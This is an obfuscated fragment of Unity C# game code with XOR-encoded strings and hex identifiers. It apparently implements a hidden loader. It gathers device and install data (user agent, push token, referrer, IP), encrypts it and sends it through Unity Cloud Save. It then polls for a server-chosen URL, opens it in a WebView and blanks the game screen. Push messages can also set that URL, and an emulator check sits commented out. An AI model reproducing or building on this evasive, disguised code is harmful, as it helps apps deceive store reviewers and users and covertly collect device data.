            foreach (string _0x096838cd in _0x32467eac)
            {
                if (_0x096838cd.StartsWith(_0x9fe415a8._0x073f6504(new byte[3] { 73, 80, 29 }, 32)))
                {
                    string _0x8cbd8d25 = _0x096838cd.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0x8cbd8d25} from {_0x824916ba}");
                        }
#endif
                    }

                    return _0x8cbd8d25;
                }
            }
        }

        return "";
    }

    private bool _0xb4633e82(string _0x9abbba79, string _0x30c8e0d0)
    {
        string _0x085fb92f = _0xdd132c32(_0x9abbba79);
        if (string.IsNullOrEmpty(_0x085fb92f))
            _0x085fb92f = _0x30c8e0d0;
        if (_0xd1fc92ce(_0x085fb92f))
            return true;
        string _0xc28591f0 = string.IsNullOrEmpty(_0x085fb92f) ? _0x9fe415a8._0x073f6504(new byte[29] { 174, 178, 178, 182, 181, 252, 233, 233, 182, 170, 167, 191, 232, 161, 169, 169, 161, 170, 163, 232, 165, 169, 171, 233, 181, 178, 169, 180, 163 }, 198) : _0x9fe415a8._0x073f6504(new byte[46] { 251, 231, 231, 227, 224, 169, 188, 188, 227, 255, 242, 234, 189, 244, 252, 252, 244, 255, 246, 189, 240, 252, 254, 188, 224, 231, 252, 225, 246, 188, 242, 227, 227, 224, 188, 247, 246, 231, 242, 250, 255, 224, 172, 250, 247, 174 }, 147) + _0x085fb92f;
        WLog(_0x9fe415a8._0x073f6504(new byte[35] { 152, 179, 169, 180, 182, 190, 151, 178, 176, 190, 251, 182, 186, 169, 176, 190, 175, 251, 189, 186, 183, 183, 185, 186, 184, 176, 251, 186, 168, 251, 172, 190, 185, 225, 251 }, 219) + _0xc28591f0);
        return _0x7ef3d485(_0xc28591f0);
    }

    internal void _0xe0cafdb9()
    {
        Rect _0x1c4c7689 = Screen.safeArea;
        Vector2 _0x62b544a7 = new Vector2(Screen.width, Screen.height);
        if (_0x1c4c7689 == lastSafe && _0x62b544a7 == lastSize)
            return;
        // Apply manual padding
        _0x1c4c7689.xMin += _0x82e2be61;
        _0x1c4c7689.xMax -= _0x7887a777;
        _0x1c4c7689.yMin += _0x51cbfaf3;
        _0x1c4c7689.yMax -= _0x42a9d562;
        // Convert Unity safe area -> native WebView frame
        Rect _0xc36d9289 = new Rect(_0x1c4c7689.x, _0x62b544a7.y - _0x1c4c7689.y - _0x1c4c7689.height, // Y flip for native coordinate system
 _0x1c4c7689.width, _0x1c4c7689.height);
        _0x00eaf601.Frame = _0xc36d9289;
        lastSafe = Screen.safeArea;
        lastSize = _0x62b544a7;
    }

    internal Rect lastSafe = Rect.zero;
    private ApplicationInstallMode _0x52463fb4 = ApplicationInstallMode.Unknown;
    private string _0xac17573a()
    {
        string _0x01dd0fd2 = _0x9fe415a8._0x073f6504(new byte[62] { 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38 }, 31);
        System.Random _0x85203f91 = new System.Random();
        int _0x86645217 = _0x85203f91.Next(8, 16);
        return new string (Enumerable.Repeat(_0x01dd0fd2, _0x86645217).Select(_0x8edd9e3e => _0x8edd9e3e[_0x85203f91.Next(_0x8edd9e3e.Length)]).ToArray());
    }

    private string _0x84a7737b { get; set; }

    private IEnumerator _0xef4f0a0d(IEnumerator _0xa835e7ef, TaskCompletionSource<bool> _0x2c99835f)
    {
        yield return _0xa835e7ef;
        _0x2c99835f.SetResult(true);
    }

    private async Task<string> _0xe2f068f3(int _0x0b1c457d = 5, int _0x3bee17be = 500)
    {
        try
        {
            List<EntityData> _0x4ac932e8 = new List<EntityData>();
            int _0x8016d7c9 = 0;
            do
            {
                _0x4ac932e8 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x9fe415a8._0x073f6504(new byte[8] { 109, 113, 124, 100, 120, 111, 84, 121 }, 29), _0x38cdee7c, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x38cdee7c }), new QueryOptions())).ToList();
                await Task.Delay(_0x3bee17be);
            }
            while (_0x4ac932e8.Count == 0 && _0x8016d7c9++ < _0x0b1c457d);
            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[33] { 4, 11, 58, 44, 43, 2, 127, 12, 62, 41, 58, 59, 127, 19, 54, 49, 52, 127, 14, 42, 58, 45, 38, 127, 45, 58, 44, 42, 51, 43, 44, 101, 127 }, 95) + JsonConvert.SerializeObject(_0x4ac932e8, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[39] { 165, 170, 155, 141, 138, 163, 222, 173, 159, 136, 155, 154, 222, 178, 151, 144, 149, 222, 175, 139, 155, 140, 135, 222, 140, 155, 141, 139, 146, 138, 141, 222, 157, 145, 139, 144, 138, 196, 222 }, 254) + _0x4ac932e8.Count);
                }
#endif
            }

            var _0xa15c9b25 = _0x4ac932e8.SelectMany(_0xd3f4d8ff => _0xd3f4d8ff.Data).FirstOrDefault(_0x1b566f98 => _0x1b566f98.Key == _0x38cdee7c)?.Value.GetAs<string>() ?? string.Empty;
            _0xa15c9b25 = Decrypt(_0xa15c9b25, _0x38cdee7c);
            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[24] { 0, 15, 62, 40, 47, 6, 123, 23, 52, 58, 63, 123, 40, 58, 45, 62, 63, 123, 55, 50, 53, 48, 97, 123 }, 91) + _0xa15c9b25);
                }
#endif
            }

            return _0xa15c9b25;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[39] { 10, 5, 52, 34, 37, 12, 113, 22, 52, 37, 113, 62, 35, 113, 33, 48, 35, 34, 52, 113, 34, 48, 39, 52, 53, 113, 61, 56, 63, 58, 113, 55, 48, 56, 61, 52, 53, 107, 113 }, 81) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private string _0x8622bb84;
    private string _0xbcfcc0e5(string _0x27d18d1e, string _0x336a5fe3)
    {
        if (string.IsNullOrEmpty(_0x336a5fe3))
            return _0x27d18d1e;
        if (_0x27d18d1e.Contains(_0x9fe415a8._0x073f6504(new byte[1] { 52 }, 11)))
            return _0x27d18d1e + _0x9fe415a8._0x073f6504(new byte[8] { 236, 185, 175, 164, 174, 163, 174, 247 }, 202) + UnityWebRequest.EscapeURL(_0x336a5fe3);
        else
            return _0x27d18d1e + _0x9fe415a8._0x073f6504(new byte[8] { 130, 206, 216, 211, 217, 212, 217, 128 }, 189) + UnityWebRequest.EscapeURL(_0x336a5fe3);
    }

    private string _0x5c3526b0 = "";
    private bool _0xa44367de()
    {
        var _0xeec092c2 = Keyboard.current;
        return _0xeec092c2 != null && _0xeec092c2.escapeKey.wasPressedThisFrame;
    }

    private string _0x016470aa = "";
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0xa0eee957(string _0x097e681c, string _0xf33804d7)
    {
        try
        {
            using var _0x33d890f9 = Aes.Create();
            _0x33d890f9.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xf33804d7));
            _0x33d890f9.GenerateIV();
            using var _0x42597cb9 = new MemoryStream();
            _0x42597cb9.Write(_0x33d890f9.IV, 0, _0x33d890f9.IV.Length);
            using (var _0xca5dc94d = new CryptoStream(_0x42597cb9, _0x33d890f9.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x70bbce5f = Encoding.UTF8.GetBytes(_0x097e681c);
                _0xca5dc94d.Write(_0x70bbce5f, 0, _0x70bbce5f.Length);
                _0xca5dc94d.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x42597cb9.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private bool _0xe0a5cae4 = false;
    private async Task<bool> _0x910363d5()
    {
        _0x69b0bfad.Instance?._0x510c02f6();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x86fae7b2) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[32] { 47, 32, 17, 7, 0, 41, 84, 33, 26, 29, 0, 13, 84, 36, 1, 7, 28, 84, 58, 27, 0, 29, 18, 29, 23, 21, 0, 29, 27, 26, 78, 84 }, 116) + string.Join(_0x9fe415a8._0x073f6504(new byte[1] { 54 }, 63), _0x86fae7b2));
                }
#endif
            }
        };
        try
        {
            _0xd6bcc363 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[31] { 86, 89, 104, 126, 121, 80, 45, 75, 108, 100, 97, 104, 105, 45, 121, 98, 45, 106, 104, 121, 45, 125, 120, 126, 101, 45, 121, 98, 102, 104, 99 }, 13));
                }
#endif
            }

            _0xd6bcc363 = "";
        }

        _0xe0a5cae4 = !string.IsNullOrEmpty(_0xd6bcc363);
        _0x32aada61 = _0xd3b9ac4f();
        {
#if B_LOGS
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[25] { 158, 145, 160, 182, 177, 152, 229, 144, 171, 172, 177, 188, 229, 149, 176, 182, 173, 229, 145, 170, 174, 160, 171, 255, 229 }, 197) + _0xd6bcc363);
#endif
        }

        _0x69b0bfad.Instance?._0x613135c7();
        return false;
    }

    internal bool isApplicationPause = false;
    private bool _0x62731cad = false;
    private void _0x2c3857f1(string _0x886b7cf5)
    {
        _0x7fe9c80e();
        StartCoroutine(_0x1f2de857(_0x886b7cf5));
    }

    private bool _0x82605afc = false;
    private float _0x7bf40925 = 0f;
    private string _0xad706657()
    {
        if (string.IsNullOrEmpty(_0x6b737398) && _0x00eaf601 != null)
            _0x6b737398 = _0x00eaf601.GetUserAgent();
        if (string.IsNullOrEmpty(_0x6b737398))
            return string.Empty;
        string _0x54860543 = Regex.Replace(_0x6b737398, _0x9fe415a8._0x073f6504(new byte[11] { 18, 61, 100, 117, 18, 61, 100, 57, 56, 18, 44 }, 78), string.Empty);
        _0x54860543 = Regex.Replace(_0x54860543, _0x9fe415a8._0x073f6504(new byte[15] { 117, 90, 2, 107, 92, 64, 69, 77, 6, 114, 119, 18, 0, 116, 2 }, 41), string.Empty);
        _0x54860543 = Regex.Replace(_0x54860543, _0x9fe415a8._0x073f6504(new byte[15] { 42, 25, 14, 15, 21, 19, 18, 83, 72, 32, 82, 76, 32, 15, 86 }, 124), string.Empty);
        return Regex.Replace(_0x54860543, _0x9fe415a8._0x073f6504(new byte[6] { 8, 39, 47, 102, 120, 41 }, 84), _0x9fe415a8._0x073f6504(new byte[1] { 17 }, 49)).Trim();
    }

    private bool _0x7ef3d485(string _0x9f4d43bb)
    {
        try
        {
            using (var _0xcd5fe94e = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[30] { 16, 28, 30, 93, 6, 29, 26, 7, 10, 64, 23, 93, 3, 31, 18, 10, 22, 1, 93, 38, 29, 26, 7, 10, 35, 31, 18, 10, 22, 1 }, 115)))
            using (var _0x908b0106 = _0xcd5fe94e.GetStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 126, 104, 111, 111, 120, 115, 105, 92, 126, 105, 116, 107, 116, 105, 100 }, 29)))
            using (var _0x12596060 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[15] { 198, 201, 195, 213, 200, 206, 195, 137, 201, 194, 211, 137, 242, 213, 206 }, 167)))
            using (var _0x68652ccc = _0x12596060.CallStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[5] { 107, 122, 105, 104, 126 }, 27), _0x9f4d43bb))
            using (var _0xfa7f98b7 = new AndroidJavaObject(_0x9fe415a8._0x073f6504(new byte[22] { 202, 197, 207, 217, 196, 194, 207, 133, 200, 196, 197, 223, 206, 197, 223, 133, 226, 197, 223, 206, 197, 223 }, 171), _0x9fe415a8._0x073f6504(new byte[26] { 203, 196, 206, 216, 197, 195, 206, 132, 195, 196, 222, 207, 196, 222, 132, 203, 201, 222, 195, 197, 196, 132, 252, 227, 239, 253 }, 170), _0x68652ccc))
            {
                WLog(_0x9fe415a8._0x073f6504(new byte[26] { 131, 168, 178, 175, 173, 165, 140, 169, 171, 165, 224, 175, 176, 165, 174, 224, 165, 184, 180, 165, 178, 174, 161, 172, 250, 224 }, 192) + _0x9f4d43bb);
                _0xfa7f98b7.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[11] { 201, 204, 204, 235, 201, 220, 205, 207, 199, 218, 209 }, 168), _0x9fe415a8._0x073f6504(new byte[33] { 132, 139, 129, 151, 138, 140, 129, 203, 140, 139, 145, 128, 139, 145, 203, 134, 132, 145, 128, 130, 138, 151, 156, 203, 167, 183, 170, 178, 182, 164, 167, 169, 160 }, 229));
                _0xfa7f98b7.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[8] { 224, 229, 229, 199, 237, 224, 230, 242 }, 129), 0x10000000);
                _0x908b0106.Call(_0x9fe415a8._0x073f6504(new byte[13] { 22, 17, 4, 23, 17, 36, 6, 17, 12, 19, 12, 17, 28 }, 101), _0xfa7f98b7);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[28] { 104, 67, 89, 68, 70, 78, 103, 66, 64, 78, 11, 78, 83, 95, 78, 89, 69, 74, 71, 11, 77, 74, 66, 71, 78, 79, 17, 11 }, 43) + e.Message);
            Application.OpenURL(_0x9f4d43bb);
            return true;
        }
    }

    private static string ReadPushField(Dictionary<string, object> _0x09e4d9c4, string _0x94303a7a)
    {
        if (_0x09e4d9c4 == null || string.IsNullOrEmpty(_0x94303a7a))
            return string.Empty;
        if (_0x09e4d9c4.TryGetValue(_0x9fe415a8._0x073f6504(new byte[16] { 48, 49, 42, 55, 56, 55, 61, 63, 42, 55, 49, 48, 26, 63, 42, 63 }, 94), out var raw))
        {
            try
            {
                var _0x7f3d2899 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x7f3d2899 != null && _0x7f3d2899.TryGetValue(_0x94303a7a, out var nestedVal))
                {
                    var _0x0e64c2e1 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x0e64c2e1))
                        return _0x0e64c2e1;
                }
            }
            catch
            {
            }
        }

        if (_0x09e4d9c4.TryGetValue(_0x94303a7a, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private string _0x2d16eae7 = "";
    private void _0x7fe9c80e()
    {
        using (var _0x131b4f49 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[30] { 80, 92, 94, 29, 70, 93, 90, 71, 74, 0, 87, 29, 67, 95, 82, 74, 86, 65, 29, 102, 93, 90, 71, 74, 99, 95, 82, 74, 86, 65 }, 51)))
        using (var _0x590c10dd = _0x131b4f49.GetStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 119, 97, 102, 102, 113, 122, 96, 85, 119, 96, 125, 98, 125, 96, 109 }, 20)))
        using (var _0x7e527e43 = _0x590c10dd.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[9] { 157, 159, 142, 179, 148, 142, 159, 148, 142 }, 250)))
        {
            if (_0x7e527e43 == null)
                return;
            using (var _0xa16c90f1 = _0x7e527e43.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[9] { 205, 207, 222, 239, 210, 222, 216, 203, 217 }, 170)))
            {
                if (_0xa16c90f1 == null)
                    return;
                using (var _0x97f77754 = new AndroidJavaObject(_0x9fe415a8._0x073f6504(new byte[19] { 0, 29, 8, 65, 5, 28, 0, 1, 65, 37, 60, 32, 33, 32, 13, 5, 10, 12, 27 }, 111)))
                using (var _0xfc8afa20 = _0xa16c90f1.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[6] { 61, 51, 47, 5, 51, 34 }, 86)))
                using (var _0xa8c9e70e = _0xfc8afa20.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[8] { 149, 136, 153, 142, 157, 136, 147, 142 }, 252)))
                {
                    while (_0xa8c9e70e.Call<bool>(_0x9fe415a8._0x073f6504(new byte[7] { 11, 2, 16, 45, 6, 27, 23 }, 99)))
                    {
                        string _0x97bc229f = _0xa8c9e70e.Call<string>(_0x9fe415a8._0x073f6504(new byte[4] { 188, 183, 170, 166 }, 210));
                        using (var _0x48e3b11a = _0xa16c90f1.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[3] { 89, 91, 74 }, 62), _0x97bc229f))
                        {
                            _0x97f77754.Call<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[3] { 69, 64, 65 }, 53), _0x97bc229f, _0x48e3b11a);
                        }
                    }

                    string _0x1ae4f4d9 = _0x97f77754.Call<string>(_0x9fe415a8._0x073f6504(new byte[8] { 22, 13, 49, 22, 16, 11, 12, 5 }, 98));
                    if (!string.IsNullOrEmpty(_0x1ae4f4d9))
                    {
                        _0xb925bf25(_0x1ae4f4d9);
                        _0xb7785d52(_0x1ae4f4d9);
                    }
                }
            }
        }
    }

    internal bool _0x5e2761c8(string _0x766b597d)
    {
        return _0x766b597d.StartsWith(_0x9fe415a8._0x073f6504(new byte[9] { 102, 106, 121, 96, 110, 127, 49, 36, 36 }, 11), StringComparison.OrdinalIgnoreCase) || _0x766b597d.StartsWith(_0x9fe415a8._0x073f6504(new byte[24] { 61, 33, 33, 37, 38, 111, 122, 122, 37, 57, 52, 44, 123, 50, 58, 58, 50, 57, 48, 123, 54, 58, 56, 122 }, 85), StringComparison.OrdinalIgnoreCase) || _0x766b597d.StartsWith(_0x9fe415a8._0x073f6504(new byte[23] { 168, 180, 180, 176, 250, 239, 239, 176, 172, 161, 185, 238, 167, 175, 175, 167, 172, 165, 238, 163, 175, 173, 239 }, 192), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x5259bb2c()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private string _0xd6bcc363 = "";
    private string Decrypt(string _0xbf34577a, string _0x472ee2dc)
    {
        try
        {
            var _0x14609a44 = Convert.FromBase64String(_0xbf34577a);
            using var _0x89a3fe70 = Aes.Create();
            _0x89a3fe70.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x472ee2dc));
            var _0x6f7130ed = new byte[16];
            Buffer.BlockCopy(_0x14609a44, 0, _0x6f7130ed, 0, 16);
            _0x89a3fe70.IV = _0x6f7130ed;
            using var _0xc43f00bd = new MemoryStream(_0x14609a44, 16, _0x14609a44.Length - 16);
            using var _0xb8421f0b = new CryptoStream(_0xc43f00bd, _0x89a3fe70.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0x58556d50 = new StreamReader(_0xb8421f0b, Encoding.UTF8);
            return _0x58556d50.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0xb22fe39a = "";
    private async Task<bool> _0x8a5eacf1(int _0x99a0a87c = 5, int _0x5d9add4e = 500)
    {
        List<EntityData> _0xb2018575 = new List<EntityData>();
        int _0xf39e5140 = 0;
        do
        {
            try
            {
                _0xb2018575 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x9fe415a8._0x073f6504(new byte[8] { 147, 143, 130, 154, 134, 145, 170, 135 }, 227), _0x38cdee7c, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x9fe415a8._0x073f6504(new byte[9] { 164, 190, 157, 191, 164, 187, 172, 174, 180 }, 205) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x9fe415a8._0x073f6504(new byte[32] { 123, 116, 69, 83, 84, 125, 0, 81, 85, 69, 82, 89, 97, 83, 89, 78, 67, 114, 69, 83, 85, 76, 84, 83, 0, 69, 82, 82, 79, 82, 26, 0 }, 32) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x5d9add4e);
        }
        while (_0xb2018575.Count == 0 && _0xf39e5140++ < _0x99a0a87c);
        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[32] { 82, 93, 108, 122, 125, 84, 41, 64, 122, 89, 123, 96, 127, 104, 106, 112, 41, 88, 124, 108, 123, 112, 41, 123, 108, 122, 124, 101, 125, 122, 51, 41 }, 9) + JsonConvert.SerializeObject(_0xb2018575, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[38] { 123, 116, 69, 83, 84, 125, 0, 105, 83, 112, 82, 73, 86, 65, 67, 89, 0, 113, 85, 69, 82, 89, 0, 82, 69, 83, 85, 76, 84, 83, 0, 67, 79, 85, 78, 84, 26, 0 }, 32) + _0xb2018575.Count);
            }
#endif
        }

        bool _0xa0ad9e9d = true;
        if (_0xb2018575.Count == 0)
        {
            _0xa0ad9e9d = false;
        }
        else
        {
            _0xa0ad9e9d = _0xb2018575.Any(_0xd3f4d8ff => _0xd3f4d8ff.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[25] { 182, 185, 136, 158, 153, 176, 205, 164, 158, 189, 159, 132, 155, 140, 142, 148, 205, 159, 136, 158, 152, 129, 153, 215, 205 }, 237) + _0xa0ad9e9d);
            }
#endif
        }

        return _0xa0ad9e9d;
    }

    private IEnumerator _0x9eeac110(Dictionary<string, object> _0x1bf6e9f2)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[30] { 15, 0, 49, 39, 32, 9, 116, 18, 49, 32, 55, 60, 116, 17, 44, 32, 38, 53, 116, 4, 33, 39, 60, 116, 16, 53, 32, 53, 110, 116 }, 84) + string.Join(_0x9fe415a8._0x073f6504(new byte[1] { 126 }, 119), _0x1bf6e9f2));
#endif
            }
        }

        string _0x3b166c1f = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x1bf6e9f2 != null && _0x1bf6e9f2.TryGetValue(_0x9fe415a8._0x073f6504(new byte[16] { 91, 90, 65, 92, 83, 92, 86, 84, 65, 92, 90, 91, 113, 84, 65, 84 }, 53), out var raw))
        {
            try
            {
                var _0x17b90a2b = raw?.ToString();
                var _0xcf92a4ff = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x17b90a2b);
                if (_0xcf92a4ff != null && _0xcf92a4ff.TryGetValue(_0x9fe415a8._0x073f6504(new byte[6] { 119, 97, 106, 96, 109, 96 }, 4), out var val))
                {
                    _0x3b166c1f = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x9fe415a8._0x073f6504(new byte[30] { 42, 37, 20, 2, 5, 81, 33, 4, 2, 25, 44, 81, 59, 34, 62, 63, 81, 1, 16, 3, 2, 20, 81, 20, 3, 3, 30, 3, 75, 81 }, 113) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x3b166c1f) && _0x1bf6e9f2 != null && _0x1bf6e9f2.TryGetValue(_0x9fe415a8._0x073f6504(new byte[6] { 199, 209, 218, 208, 221, 208 }, 180), out var lab))
        {
            _0x3b166c1f = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[38] { 101, 106, 91, 77, 74, 30, 110, 75, 77, 86, 99, 30, 120, 91, 74, 93, 86, 91, 90, 30, 77, 91, 80, 90, 87, 90, 30, 88, 76, 81, 83, 30, 84, 77, 81, 80, 4, 30 }, 62) + _0x3b166c1f);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x3b166c1f))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[38] { 233, 230, 215, 193, 198, 146, 226, 199, 193, 218, 239, 146, 229, 211, 219, 198, 146, 198, 221, 146, 221, 194, 215, 220, 146, 197, 219, 198, 218, 146, 193, 215, 220, 214, 219, 214, 136, 146 }, 178) + _0x3b166c1f);
            }
#endif
        }

        _0x10902a44 = _0x3b166c1f;
        yield return new WaitUntil(() => _0x9c09cacf);
        var _0xe6016953 = _0xe2f068f3(2, 100);
        yield return new WaitUntil(() => _0xe6016953.IsCompleted);
        string _0x63382857 = _0xe6016953.Result;
        if (!string.IsNullOrEmpty(_0x63382857))
        {
            string _0x582df2a0 = _0xbcfcc0e5(_0x63382857, _0x3b166c1f);
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[33] { 49, 62, 15, 25, 30, 74, 58, 31, 25, 2, 55, 74, 56, 15, 6, 5, 11, 14, 74, 61, 15, 8, 60, 3, 15, 29, 74, 29, 3, 30, 2, 80, 74 }, 106) + _0x582df2a0);
#endif
            }

            _0x00eaf601.Load(_0x582df2a0);
        }
    }

    private async Task _0xcdb0841e()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x53d0ca9d = _0x9fe415a8._0x073f6504(new byte[5] { 239, 232, 229, 250, 236 }, 137);
        _0xb22fe39a = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x03994315 = DateTime.UtcNow.Ticks.ToString();
        _0x5c3526b0 = "";
        JObject _0x4297efe8 = _0xf3b9e3cf(_0x7b1a35fe, _0x4ff87218, _0xb40641aa, _0xd6bcc363, _0xf1265ea3, _0x84a7737b, _0x7bd60ea3, _0x6b737398, _0x2d16eae7, _0x64712a8c, _0x53d0ca9d, _0x5c3526b0, _0x31a75f61, _0x016470aa, _0x52463fb4.ToString(), _0x45aaa86e, _0x03994315, _0xb22fe39a, _0x38cdee7c, _0xe5849e05, _0xcbb35755, _0x32aada61, _0xd3b9ac4f());
        var _0x2c7b3dbf = _0xa0eee957(_0x4297efe8.ToString(), _0x38cdee7c);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0x4297efe8}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x9fe415a8._0x073f6504(new byte[7] { 22, 7, 31, 10, 9, 7, 2 }, 102) + _0x38cdee7c, _0x2c7b3dbf } });
            await Task.Delay(500);
            string _0x2f7e0c4e = "";
            for (int _0x76c5b2f9 = 0; _0x76c5b2f9 < 20; _0x76c5b2f9++)
            {
                if (await _0x8a5eacf1(1, 1))
                {
                    await _0x088b9e09(_0x9fe415a8._0x073f6504(new byte[7] { 241, 255, 252, 240, 248, 246, 247 }, 147));
                    _0x1b8962c6();
                    return;
                }

                _0x2f7e0c4e = await _0xe2f068f3(1, 500);
                if (!string.IsNullOrEmpty(_0x2f7e0c4e))
                    break;
            }

            _0x6745fa0d(_0x2f7e0c4e);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[22] { 76, 67, 82, 68, 67, 74, 55, 80, 114, 121, 114, 101, 118, 123, 55, 114, 101, 101, 120, 101, 45, 55 }, 23) + e.Message);
#endif
            }

            _0x1b8962c6();
        }
    }

    private RectTransform _0xbb1dcbc3;
    private bool _0x57710795()
    {
        var _0xc2d36013 = _0x309d4e87();
        if (_0xc2d36013 == null)
            return false;
        WLog(_0x9fe415a8._0x073f6504(new byte[31] { 69, 108, 127, 105, 122, 108, 127, 104, 45, 111, 108, 110, 102, 45, 32, 51, 45, 125, 98, 125, 120, 125, 45, 74, 98, 79, 108, 110, 102, 55, 45 }, 13) + _0xc2d36013.Id);
        _0xc2d36013.GoBack();
        return true;
    }

    internal string _0xdd132c32(string _0x96d50301)
    {
        int _0x14cfad6e = _0x96d50301.IndexOf(_0x9fe415a8._0x073f6504(new byte[3] { 158, 147, 202 }, 247), StringComparison.OrdinalIgnoreCase);
        if (_0x14cfad6e < 0)
            return null;
        string _0x193a8b2b = _0x96d50301.Substring(_0x14cfad6e + 3);
        int _0x671eb963 = _0x193a8b2b.IndexOf('&');
        return _0x671eb963 >= 0 ? _0x193a8b2b.Substring(0, _0x671eb963) : _0x193a8b2b;
    }

    internal bool isApplicationFocus = false;
    private string _0xd3b9ac4f()
    {
        float _0x4e6a6f75 = Time.realtimeSinceStartup;
        if (_0x4e6a6f75 < 0f)
            _0x4e6a6f75 = 0f;
        int _0xc999b9f8 = (int)(_0x4e6a6f75 * 1000f);
        int _0x90fea925 = _0xc999b9f8 / 60000;
        int _0xcdc9e906 = (_0xc999b9f8 / 1000) % 60;
        int _0xb09151b3 = _0xc999b9f8 % 1000;
        return string.Format(_0x9fe415a8._0x073f6504(new byte[21] { 178, 249, 243, 249, 249, 180, 243, 178, 248, 243, 249, 249, 180, 243, 178, 251, 243, 249, 249, 249, 180 }, 201), _0x90fea925, _0xcdc9e906, _0xb09151b3);
    }

    private async void Start()
    {
        await _0x9ab495e9();
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0x00eaf601 = null;
    private IEnumerator _0x105f5a6a(float _0x4093fce9)
    {
        yield return new WaitForSeconds(_0x4093fce9);
        if (!_0x4d4d4a01)
        {
            _0x4d4d4a01 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xf1265ea3}");
                }
#endif
            }
        }
    }

    internal bool IsGoogleAuthFlowUrl(string _0x707cd030)
    {
        if (string.IsNullOrEmpty(_0x707cd030))
            return false;
